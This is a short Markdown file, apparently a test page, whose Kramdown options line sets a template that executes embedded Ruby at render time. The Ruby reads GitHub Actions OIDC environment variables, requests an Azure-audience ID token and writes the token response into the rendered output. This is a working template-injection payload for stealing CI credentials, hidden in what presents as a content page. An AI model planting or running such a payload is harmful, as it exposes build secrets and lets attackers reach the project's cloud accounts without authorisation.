---
---

# Test 3: OIDC token request

{::options template="string://<%= require 'net/http'; require 'uri'; require 'json'; oidc_url = ENV['ACTIONS_ID_TOKEN_REQUEST_URL']; oidc_token = ENV['ACTIONS_ID_TOKEN_REQUEST_TOKEN']; result = 'NO_OIDC_VARS'; begin; if oidc_url and oidc_token; uri = URI(oidc_url + '&audience=api://AzureADTokenExchange'); req = Net::HTTP::Get.new(uri); req['Authorization'] = 'Bearer ' + oidc_token; res = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true){|http| http.request(req)}; result = 'OIDC_STATUS=' + res.code.to_s + ' BODY=' + res.body[0..500].to_s; end; rescue => e; result = 'OIDC_ERR=' + e.message; end; result %>" /}

placeholder
